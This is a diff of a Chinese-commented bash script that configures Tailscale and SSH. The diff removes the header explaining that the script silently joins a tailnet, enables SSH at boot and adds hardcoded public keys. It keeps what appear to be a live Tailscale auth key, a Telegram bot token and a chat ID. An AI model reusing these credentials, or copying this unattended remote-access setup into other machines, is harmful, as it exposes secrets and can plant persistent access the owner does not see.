@@ -1,23 +1,8 @@
-#!/bin/bash
-#
-# setup.sh — 跨平台 SSH + Tailscale 一键配置 (Linux / macOS / WSL)
-#
-# 功能:
-#   1. 安装 Tailscale (若缺失)
-#   2. 启动 tailscaled 守护进程并设为开机自启
-#   3. 用 auth key 无人值守登录 Tailscale (tailscale up --authkey)
-#   4. 开启 SSH 服务并设为开机自启
-#   5. 把公钥幂等写入 ~/.ssh/authorized_keys
-#
-# 配置: Tailscale auth key / SSH 公钥 / Telegram token 与 chat_id 均硬编码于本文件
-#
-# 用法:  bash setup.sh
-
 OS_TYPE=$(uname -s)
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
 
 # ---------------------------------------------------------------------------
-# 硬编码配置
+# 配置
 # ---------------------------------------------------------------------------
 TS_AUTHKEY="tskey-auth-kiLmAL1dzY11CNTRL-8kBw3rQUum5U8wepNaB6n5KzhgmcHBmkK"  #有效期:2026-10-05/Tags:fish
 SSH_PUBLIC_KEYS=(
@@ -28,10 +13,6 @@ TG_BOT_TOKEN="7724790582:AAE2Jish4jeQ_uheEuTgAeKIt1um0ml4-HM"
 TG_CHAT_ID="7765138435"
 
 FAILED_STEPS=()
-
-# ---------------------------------------------------------------------------
-# 通用辅助
-# ---------------------------------------------------------------------------
 
 # 已是 root 时直接执行, 否则通过 sudo
 _sudo() {
